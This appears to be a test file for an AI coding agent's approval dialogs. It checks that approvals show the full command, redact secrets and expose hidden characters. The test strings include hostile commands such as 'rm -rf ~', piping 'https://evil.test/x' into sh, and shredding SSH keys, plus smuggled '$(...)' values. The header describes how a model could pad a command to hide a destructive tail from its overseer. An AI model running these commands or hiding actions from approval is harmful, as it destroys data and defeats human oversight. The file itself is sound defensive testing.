// Approval dialogs show what will actually run (issue #316; §41.2, §16.4). A
// model can pad a harmless prefix past any character cap and hide a
// destructive tail: the request therefore carries the FULL command
// (control characters neutralized, secrets redacted), the summary never
// truncates silently, and orchestrator worker asks forward the full command
// to the manager's seat. Hermetic: temp dirs only, cleaned in afterEach.
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import {
  approvalCommandText,
  SUMMARY_COMMAND_LIMIT,
  summarizeCommand,
} from './approval-display.js';
import {
  type ApprovalRequest,
  ApprovalService,
  approvalKey,
  createApprovalAsk,
  FileApprovalStore,
  summarizeRequest,
  type TriggerContext,
  validatePolicy,
} from './approvals.js';
import {
  buildOrchestratorRequest,
  type OrchestratorApprovalRequest,
} from './orchestrator/approvals/request.js';
import {
  ASKS_DIR,
  answerWorkerAsk,
  createWorkerAskRouter,
  createWorkerMailboxSeat,
  formatWorkerAskQuestion,
  readPendingWorkerAsks,
} from './orchestrator/approvals/worker-asks.js';

const made: string[] = [];

function tmp(): string {
  const dir = mkdtempSync(join(tmpdir(), 'approval-display-'));
  made.push(dir);
  return dir;
}

afterEach(() => {
  for (const dir of made.splice(0))
    rmSync(dir, { recursive: true, force: true });
});

// A harmless prefix padded past every cap, then the destructive tail.
const PADDED = `echo 'running formatter' ${'x'.repeat(380)}; rm -rf ~/work`;

function triggerContext(): TriggerContext {
  return {
    workspace: '/work',
    network: 'none',
    isDestructive: (command) => /rm -rf/.test(command),
    isNetworkCommand: () => false,
    isOutsideWorkspace: () => false,
  };
}

async function waitFor(condition: () => boolean): Promise<void> {
  for (let i = 0; i < 500 && !condition(); i += 1) {
    await new Promise((resolve) => setTimeout(resolve, 2));
  }
  expect(condition()).toBe(true);
}

describe('summaries never truncate silently (issue #316)', () => {
  it('marks a truncated command summary with the hidden length', () => {
    const summary = summarizeRequest('bash', 'destructive-shell', {
      command: PADDED,
    });
    const hidden = PADDED.length - SUMMARY_COMMAND_LIMIT;
    expect(summary).toContain(`… (+${hidden} chars)`);
    expect(summary).not.toContain('rm -rf ~/work');
  });

  it('leaves a short command summary untouched', () => {
    expect(
      summarizeRequest('bash', 'destructive-shell', {
        command: 'rm -rf /tmp/x',
      }),
    ).toBe('destructive-shell: rm -rf /tmp/x');
  });

  it('neutralizes control and bidi characters and redacts secrets in the command text', () => {
    const text = approvalCommandText(
      'echo \u001b[2Jhi\u0007 \u202eevil --token abc123secret\nrm -rf x',
    );
    // biome-ignore lint/suspicious/noControlCharactersInRegex: asserting none survive
    expect(text).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f\u202e]/);
    expect(text).toContain('\\x1b[2J');
    expect(text).toContain('\\x07');
    expect(text).toContain('\\u202e');
    expect(text).not.toContain('abc123secret');
    // Newlines are kept: a multi-line command is shown as its lines.
    expect(text.split('\n')).toHaveLength(2);
  });
});

describe('the request carries the full command (issue #316)', () => {
  it('the approval key and the displayed command come from the same args', async () => {
    const seen: ApprovalRequest[] = [];
    const store = new FileApprovalStore(tmp());
    const service = new ApprovalService({
      policy: validatePolicy({ maxPendingMs: 1000 }),
      store,
      awaitAnswer: async (request) => {
        seen.push(request);
        return { approved: false, reason: 'no' };
      },
    });
    const ask = createApprovalAsk(service, triggerContext(), store);
    const args = { command: PADDED };
    await ask({ toolName: 'bash', args, toolCallId: 'c1' });
    const request = seen[0];
    expect(request?.command).toBe(PADDED);
    expect(request?.command?.endsWith('; rm -rf ~/work')).toBe(true);
    expect(request?.key).toBe(approvalKey('bash', 'destructive-shell', args));
  });
});

describe('orchestrator worker asks forward the full command (issue #316)', () => {
  it('derives a full command and a marked summary from the args', () => {
    const request = buildOrchestratorRequest({
      trigger: 'destructive-shell',
      toolName: 'bash',
      args: { command: PADDED },
      justification: 'clean the build output before rebuilding',
      sessionId: 's',
      agentId: 'worker-1',
      role: 'worker',
      worktree: '/wt',
      provenance: { parentSessionId: 'p' },
    });
    expect(request.command).toBe(PADDED);
    expect(request.summary).toMatch(/… \(\+\d+ chars\)$/);
    expect(formatWorkerAskQuestion(request)).toContain(PADDED);
  });

  it('a worker ask delivers the full command to the manager seat', async () => {
    const dir = tmp();
    mkdirSync(join(dir, ASKS_DIR), { recursive: true });
    const childSeat = createWorkerMailboxSeat({
      dir,
      maxPendingMs: 5000,
      pollMs: 2,
    });
    const verdict = childSeat({
      key: 'k',
      capability: 'destructive-shell',
      toolName: 'bash',
      summary: summarizeRequest('bash', 'destructive-shell', {
        command: PADDED,
      }),
      command: PADDED,
      justification: 'clean the build output before rebuilding',
    });
    await waitFor(() => readPendingWorkerAsks(dir).length === 1);
    const published = readPendingWorkerAsks(dir)[0];
    if (published === undefined) throw new Error('no ask published');
    const shown: OrchestratorApprovalRequest[] = [];
    const router = createWorkerAskRouter({
      dir,
      maxPendingMs: 5000,
      seat: async (request) => {
        shown.push(request);
        return { approved: false, reason: 'not now' };
      },
    });
    const { request, args } = published;
    const outcome = await router.ask({
      trigger: request.trigger,
      toolName: request.toolName,
      args,
      justification: request.justification,
      sessionId: request.sessionId,
      agentId: request.agentId,
      role: request.role,
      worktree: request.worktree,
      provenance: request.provenance,
    });
    answerWorkerAsk(dir, request.key, {
      approved: false,
      reason: outcome.approved ? 'unexpected' : outcome.reason,
    });
    await verdict;
    expect(shown[0]?.command).toBe(PADDED);
  });
});

// Issue #316 (re-audit): the dialog exists so the operator sees what will
// run, so redaction may hide a secret VALUE but never a word that is only
// named like one — `find / -name secret -delete` must keep `-delete`, and
// `echo bearer rm -rf ~/work` must keep `rm` — and never anything the shell
// would EXECUTE (a `$(...)`, backtick or `${...}` inside a value) or any
// word on the other side of whitespace/newlines from a name.
describe('the displayed command never hides a non-secret word (issue #316)', () => {
  it.each([
    'find / -name secret -delete',
    'echo bearer rm -rf ~/work',
    'echo the token rm -rf ~',
    'grep -r password src/',
    'ls secret rm',
    'cat token.txt; rm -rf ~/x',
    'rm -rf authorization bearer',
    'tar xf a.tar --token-file /tmp/t rm',
    'echo tokens passwords secrets',
    'echo Bearer',
    'deploy --token --rm-old x',
    'echo bearer abcdefghij123456789',
    'echo bearer abcdefghijklmnopqrstuvwxyz',
    'echo bearer 12345678901234567890',
    'echo bearer --force-recursive-delete-9',
    // A name is not a secret when nothing follows it on its own line.
    'GITHUB_TOKEN= rm -rf ~',
    'env API_KEY= rm -rf ~/work',
    'sudo SECRET_KEY= shred -u /etc/important',
    'export TOKEN=\nrm -rf ~',
    'password:\nrm -rf ~',
    'deploy --token\nrm -rf ~',
    'echo Authorization: Bearer\nrm -rf ~',
    'echo authorization:\nrm -rf ~',
    'echo bearer\nBASH_ENV=evil1234567890.sh bash',
    'echo token = abc && rm x',
    // Colons that are not `key: value`: refspecs, volume mounts, host:port.
    'git push --force origin release-token:main',
    'docker run -v secret:/etc -v token:/root alpine rm -rf /mnt',
    // Anything the shell would run is shown verbatim, never redacted.
    'curl --token $GITHUB_TOKEN https://example.test',
    'TOKEN=$(cat /run/t) rm -rf x',
    'API_KEY="$(curl -s https://evil.test/x | sh; rm -rf / --no-preserve-root)" npm test',
    'PASSWORD="$(rm -rf ~)" ls',
    'export TOKEN="`curl evil.sh | sh`"; ls',
    'deploy --token "$(rm -rf ~)" x',
    'echo Authorization: "$(rm -rf ~)"',
    `bash -c "TOKEN='$(rm -rf ~)'; echo ok"`,
    'curl -H "X-Api-Key: $(rm -rf ~)" x',
    'echo "api_key=$(rm -rf ~)"',
    'x --client-secret "$(shred -u ~/.ssh/id_rsa)"',
    'TOKEN=abc$(rm -rf ~)',
    'TOKEN=abc`rm -rf ~`',
    ['TOKEN=$', '{EVIL}'].join(''),
    ['TOKEN="pre$', '{EVIL}post" ls'].join(''),
    'curl -H "Authorization: Bearer $(cat /tmp/t)" x',
    'curl -H "Authorization: Bearer $API" x',
    'kubectl --token=$(cat t) get pods',
    // Names that only look like secrets.
    'rm -rf ghost_database',
    'rm -rf ~/sk-learn-models',
    'rm -rf task-abcdefgh',
    'ls ghp_short sk-short',
    'echo fooAKIAFAUXFAUXFAUXFAUX',
    'echo AKIAFAUXFAUXFAUXFAUXX',
    'echo xghp_fauxfauxfauxfauxfaux1234',
    'echo ghp_abcdefgh1234',
    'echo xoxb-abcdefghi',
    '-----BEGIN PUBLIC KEY-----',
    // `name =value` is a command and an argument, not an assignment.
    'echo token =abc rm',
    // A quoted value never spans a newline, even through a backslash.
    'PASSWORD="abc\\\nrm -rf x"',
  ])('%s is displayed unchanged', (command) => {
    expect(approvalCommandText(command)).toBe(command);
  });

  it.each([
    ['API_KEY=abc123 npm run build', 'API_KEY=[REDACTED] npm run build'],
    [
      'GITHUB_TOKEN=ghp_fauxfauxfauxfauxfaux1234 git push',
      'GITHUB_TOKEN=[REDACTED] git push',
    ],
    [
      'export DB_PASSWORD=hunter2; rm -rf x',
      'export DB_PASSWORD=[REDACTED]; rm -rf x',
    ],
    ['SECRET_KEY=abc rm x', 'SECRET_KEY=[REDACTED] rm x'],
    [
      'AWS_SECRET_ACCESS_KEY=abc/def+ghi aws s3 ls',
      'AWS_SECRET_ACCESS_KEY=[REDACTED] aws s3 ls',
    ],
    ['password: hunter2', 'password: [REDACTED]'],
    ['password:\thunter2 rm', 'password:\t[REDACTED] rm'],
    ['mysql --password=hunter2 db', 'mysql --password=[REDACTED] db'],
    ['x --api-key=abc', 'x --api-key=[REDACTED]'],
    ['deploy --token abc123 /x', 'deploy --token [REDACTED] /x'],
    ['deploy --token\tabc123 /x', 'deploy --token\t[REDACTED] /x'],
    ['deploy --auth-token abc123 /x', 'deploy --auth-token [REDACTED] /x'],
    [
      'deploy --client-secret abc123 rm',
      'deploy --client-secret [REDACTED] rm',
    ],
    ['deploy -token abc123 /x', 'deploy -token [REDACTED] /x'],
    ['x --passphrase hunter2', 'x --passphrase [REDACTED]'],
    ['PASSWORD="two words" ls', 'PASSWORD=[REDACTED] ls'],
    ["PASSWORD='two words' ls", 'PASSWORD=[REDACTED] ls'],
    ['PASSWORD=abc"def ghi" x', 'PASSWORD=[REDACTED] x'],
    ['token=abc;rm -rf ~', 'token=[REDACTED];rm -rf ~'],
    ['token=abc&&rm -rf ~', 'token=[REDACTED]&&rm -rf ~'],
    ['token=abc|rm -rf ~', 'token=[REDACTED]|rm -rf ~'],
    ['token=abc>out rm', 'token=[REDACTED]>out rm'],
    ['token=abc<in rm', 'token=[REDACTED]<in rm'],
    ['(token=abc)rm -rf ~', '(token=[REDACTED])rm -rf ~'],
    ['AWS_ACCESS_KEY=abc rm', 'AWS_ACCESS_KEY=[REDACTED] rm'],
    ['passwd=abc rm', 'passwd=[REDACTED] rm'],
    ['PRIVATE_KEY=abc rm', 'PRIVATE_KEY=[REDACTED] rm'],
    [
      'curl https://u:p4ss@host/x?token=abc&y=1',
      'curl https://u:p4ss@host/x?token=[REDACTED]&y=1',
    ],
    [
      'curl -H "Authorization: Bearer abc.def.ghi" https://example.test',
      'curl -H "Authorization: [REDACTED]" https://example.test',
    ],
    [
      "curl -H 'authorization=Basic dXNlcjpwYXNz' x",
      "curl -H 'authorization=[REDACTED]' x",
    ],
    [
      'curl -H "Authorization:   token  ghp_abcdefgh12345" x',
      'curl -H "Authorization:   [REDACTED]" x',
    ],
    [
      'curl -H "X-Api-Key: abc123" https://example.test',
      'curl -H "X-Api-Key: [REDACTED]" https://example.test',
    ],
    [
      'curl -u sk-fauxfauxfauxfauxfaux0001 https://example.test',
      'curl -u [REDACTED] https://example.test',
    ],
    ['echo AKIAFAUXFAUXFAUXFAUX rm', 'echo [REDACTED] rm'],
    ['echo xoxb-abcdefghij rm', 'echo [REDACTED] rm'],
    ['echo -----BEGIN RSA PRIVATE KEY----- rm', 'echo [REDACTED] rm'],
    ['PASSWORD="a\\"b c" ls', 'PASSWORD=[REDACTED] ls'],
    [
      'echo ghp_fauxfauxfauxfauxfaux1234 xoxb-fauxfaux1234-abcdef rm',
      'echo [REDACTED] [REDACTED] rm',
    ],
    ['echo bearer abcdefghij1234567890 rm', 'echo bearer [REDACTED] rm'],
    [
      'echo bearer eyJhbGciOiJIUzI1NiJ9.abcDEF123456.sigXYZ789 rm',
      'echo bearer [REDACTED] rm',
    ],
  ])('%s -> %s', (command, shown) => {
    expect(approvalCommandText(command)).toBe(shown);
  });

  it('a value that runs to the end of a line stops at the newline', () => {
    expect(approvalCommandText('token=abc\nrm -rf x')).toBe(
      'token=[REDACTED]\nrm -rf x',
    );
    expect(approvalCommandText('PASSWORD="abc\nrm -rf x"')).toBe(
      'PASSWORD="abc\nrm -rf x"',
    );
  });

  it('shows a secret-shape lookalike inside a longer word as written', () => {
    // No word boundary before the `sk-` in `task-…`: not a key.
    expect(approvalCommandText('cat task-abcdefghijklmnopqrstuvwxyz')).toBe(
      'cat task-abcdefghijklmnopqrstuvwxyz',
    );
  });

  it('redaction stays linear on adversarially long input', () => {
    const budget = 1000;
    const inputs = [
      `${'a-'.repeat(50_000)} --token abc`,
      `--${'a'.repeat(100_000)} x`,
      `${'sk-'.repeat(60_000)}`,
      `${'ghp_'.repeat(50_000)}`,
      `${'token='.repeat(30_000)}`,
      `${'"'.repeat(100_000)}`,
      `token=${'a'.repeat(200_000)}`,
      `token="${'a'.repeat(200_000)}`,
      `${'bearer '.repeat(30_000)}`,
      // 16k distinct key-shaped hits: the shape pass must not be O(hits × length).
      Array.from(
        { length: 16_000 },
        (_, i) => `sk-${String(i).padStart(24, '0')}`,
      ).join(' '),
    ];
    for (const input of inputs) {
      const start = performance.now();
      approvalCommandText(input);
      expect(performance.now() - start).toBeLessThan(budget);
    }
  });

  it('16k distinct key shapes are each redacted, in one pass', () => {
    const hits = Array.from(
      { length: 16_000 },
      (_, i) => `sk-${String(i).padStart(24, '0')}`,
    );
    const shown = approvalCommandText(hits.join(' '));
    expect(shown).toBe(Array(16_000).fill('[REDACTED]').join(' '));
  });
});

// Issue #316 (re-audit): what the summary line and the persisted/logged text
// show keeps the OLD broad redaction (`redactSecrets`, like block reasons —
// approvals.ts says so): only the dialog's own `command` field uses the
// narrower display redactor. Broad over-redaction is the safe direction for
// text that leaves the screen.
describe('summaries keep the broad redaction (issue #316)', () => {
  it.each([
    [
      'npm config set //registry.npmjs.org/:_authToken npm_abcdef1234567890',
      'abcdef1234567890',
    ],
    ['git config --global github.token abc123def456', 'abc123def456'],
    ['mysqladmin -u root password hunter2', 'hunter2'],
    ['yarn config set npmAuthToken abc123', 'abc123'],
    ['x api_key abc', ' abc'],
    ['echo bearer abc123def456', 'abc123def456'],
    ['echo bearer Zm9vYmFy/YmF6cXV4MTIzNDU2Nzg5MA==', 'YmF6cXV4'],
  ])('summarizeCommand redacts the secret in %s', (command, secret) => {
    const summary = summarizeCommand('network', command);
    expect(summary).not.toContain(secret);
    expect(summary).toContain('[REDACTED]');
  });

  it('a summary still swallows the word after `secret`, like block reasons', () => {
    expect(
      summarizeCommand('destructive-shell', 'find / -name secret -delete'),
    ).toBe('destructive-shell: find / -name secret [REDACTED]');
  });

  it('a summary still escapes hidden characters', () => {
    expect(summarizeCommand('c', 'echo \u001b[2Jhi')).toBe(
      'c: echo \\x1b[2Jhi',
    );
  });

  it('the dialog command and the summary are redacted independently', () => {
    const command = 'find / -name secret -delete';
    expect(summarizeRequest('bash', 'destructive-shell', { command })).toBe(
      'destructive-shell: find / -name secret [REDACTED]',
    );
    expect(approvalCommandText(command)).toBe(command);
  });
});

// Issue #316 (re-audit): what the operator reads must be unambiguous.
describe('the displayed command cannot be forged or hidden (issue #316)', () => {
  it('a literal [REDACTED] in the command is shown escaped, never as a marker', () => {
    expect(approvalCommandText('curl -d @[REDACTED] x')).toBe(
      'curl -d @\\x5bREDACTED] x',
    );
    // The real marker is unchanged next to an escaped literal.
    expect(approvalCommandText('echo [REDACTED] token=abc')).toBe(
      'echo \\x5bREDACTED] token=[REDACTED]',
    );
    expect(approvalCommandText('echo [REDACTED] [REDACTED]')).toBe(
      'echo \\x5bREDACTED] \\x5bREDACTED]',
    );
  });

  it.each([
    ['\u3164', '\\u3164'],
    ['\u115f', '\\u115f'],
    ['\uffa0', '\\uffa0'],
    ['\u00ad', '\\xad'],
    ['\u034f', '\\u034f'],
    ['\ufe0f', '\\ufe0f'],
    ['\u{E0041}', '\\u{e0041}'],
    ['\u{E007F}', '\\u{e007f}'],
  ])('default-ignorable %j is shown as a visible escape', (ch, shown) => {
    expect(approvalCommandText(`rm${ch} -rf ~`)).toBe(`rm${shown} -rf ~`);
  });

  it('ordinary text, CJK and combining marks are untouched', () => {
    const text = 'echo \u65e5\u672c\u8a9e e\u0301 \u2713';
    expect(approvalCommandText(text)).toBe(text);
  });
});
